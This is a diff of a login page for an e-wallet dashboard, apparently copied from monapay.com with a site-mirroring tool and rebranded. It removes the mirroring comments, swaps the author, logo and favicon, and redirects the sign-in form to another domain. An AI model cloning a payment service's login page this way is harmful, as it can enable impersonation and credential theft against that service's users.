@@ -1,13 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
     
-<!-- Mirrored from www.monapay.com/dashboard/user/login by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 28 Nov 2019 15:53:53 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
 <head>
         <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="description" content="">
-<meta name="author" content="Kielsoft Innovations">
+<meta name="author" content="WebifyNG">
 <!--Import Google Icon Font-->
 <link href="../../css/materialicon.css" rel="stylesheet">
 <!--Import materialize.css-->
@@ -15,8 +14,8 @@
 <link type="text/css" rel="stylesheet" href="../../css/control/dashboard.css" />
 
 <!-- Favicon -->
-<link rel="apple-touch-icon" sizes="180x180" href="../../images/mona/Monapay_favicon.png">
-<link rel="icon" type="image/png" href="../../images/mona/Monapay_favicon.png" sizes="32x32">
+<link rel="apple-touch-icon" sizes="180x180" href="https://i.imgur.com/LDRC4Ya.png">
+<link rel="icon" type="image/png" href="https://i.imgur.com/LDRC4Ya.png" sizes="32x32">
         
 <!--Import jQuery before materialize.js-->
 <script type="text/javascript" src="../../jquery/jquery-2.1.3.min.js"></script>
@@ -25,14 +24,14 @@
 
     <body class="wallet-board-page login-page">
         <div class="login-header">
-            <a href="../../index.html" class="brand-logo login-logo"><img src="../../images/mona/applogo.png" class="app-logo login-logo" /></a>
+            <a href="../../index" class="brand-logo login-logo"><img src="https://i.imgur.com/sC5r3Wa.png" class="app-logo login-logo" /></a>
         </div>
         <main id="main">
             <div class="wrapper">
                 <section class="content">
                                         <div class="container">
                         <div class="row">
-    <form method="post" action="https://www.monapay.com/dashboard/user/login" class="col s12 login-form ewallet-form" autocomplete="off">
+    <form method="post" action="https://www.gadgetit.com.ng/dashboard/user/login" class="col s12 login-form ewallet-form" autocomplete="off">
         <div class="card login-card transparent">
             <div class=" main-color-blue-text center strong">Sign In</div>
             <div class="card-content">
@@ -122,5 +121,5 @@
         <script src="../../../embed.small.chat/T5BTHEBFDG5BBZ0DLG.js" async></script>
     </body>
 
-<!-- Mirrored from www.monapay.com/dashboard/user/login by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 28 Nov 2019 15:53:56 GMT -->
+
 </html>
